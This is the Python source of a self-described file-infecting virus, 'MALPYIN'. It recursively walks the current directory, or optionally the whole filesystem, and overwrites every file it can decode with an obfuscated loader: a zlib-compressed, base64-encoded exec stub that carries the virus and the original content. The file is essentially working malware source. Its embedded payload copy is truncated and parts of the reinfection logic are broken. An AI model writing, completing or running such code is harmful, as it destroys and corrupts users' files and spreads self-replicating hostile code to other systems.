# MALPYIN

# do we want to infect the entire filesystem?
import chardet
import os
from pathlib import Path
import re
import base64
import zlib
GLOBAL = False

def packer(vsrc, osrc):
    """
    Really simple packer that gzip the virus source and original src
    and finally, base64 encode them.
    """
    vcomp = base64.b64encode(zlib.compress(vsrc.encode('utf-8'))).decode('utf-8')
    ocomp = base64.b64encode(zlib.compress(osrc.encode('utf-8'))).decode('utf-8')
    return f'This FILE HAVE BEEN INFECTED\n# MALPYIN\n\nimport zlib,base64;\nexec(zlib.decompress(base64.b64decode("{vcomp}")));\n# MALPYOUT\n\nexec(zlib.decompress(base64.b64decode("{ocomp}")))'


#this is the payload to be encrypted and infect
malcode = r'''
# MALPYIN
if re.search(r'^exec\(\)', str(malcode)):
    print("found secondary infection")
    malcode_full = re.search(r'^exec.+\{(.*)\}',str(malcode))
    icode = zlib.decompress(base64.b64decode(malcode_full.group()))
    malcode += str(icode) +'\n'  # Use += to concatenate
if GLOBAL==True:
    fs_root = os.path.abspath('.').split(os.path.sep)[0]+os.path.sep
else:
    fs_root = '.'
files = (p.resolve() for p in Path(fs_root).glob("**/*") if p.suffix != '')
for file in files:
    try:
        with open(file, 'rb') as f:
            raw_content = f.read()

            result = chardet.detect(raw_content)
            encoding = result['encoding']
            org = raw_content.decode(encoding)
# MALPYOUT'''

# unpack the malware code
if re.search(r'^exec\(\)', str(malcode)):
    print("found secondary infection")
    malcode_full = re.search(r'^exec.+\{(.*)\}',str(malcode))
    icode = zlib.decompress(base64.b64decode(malcode_full.group()))
    malcode.append(str(icode) +'\n')

# only infect files as configured for
if GLOBAL==True:
    # pass
    fs_root = os.path.abspath('.').split(os.path.sep)[0]+os.path.sep
else:
    fs_root = '.'

# find all python files to infect
files = (p.resolve() for p in Path(fs_root).glob("**/*") if p.suffix != '')



#infect all files if they are not already infected
for file in files:
    try:
        with open(file, 'rb') as f:
            raw_content = f.read()

            # Detect the file encoding
            result = chardet.detect(raw_content)
            encoding = result['encoding']

            # Decode the content using the detected encoding
            org = raw_content.decode(encoding)
            print("encoding succuss !!!", file)
    except UnicodeDecodeError:
        print(f"Error decoding file {file} with encoding {encoding}. Skipping...")
        continue
    except Exception as e:
        print(f"Error reading file {file}: {e}. Skipping...")
        continue
    
    
    infected = False

    if "# MALPYIN" in org:
        infected = True

    if not infected:
        try:
            with open(file, 'wb') as f:
                f.write(packer(malcode, org).encode('utf-8'))
                print(" infecting succuss !!!", file)
        except Exception as e:
            print(f"Error writing to file {file}: {e}. Skipping...")

# MALPYOUT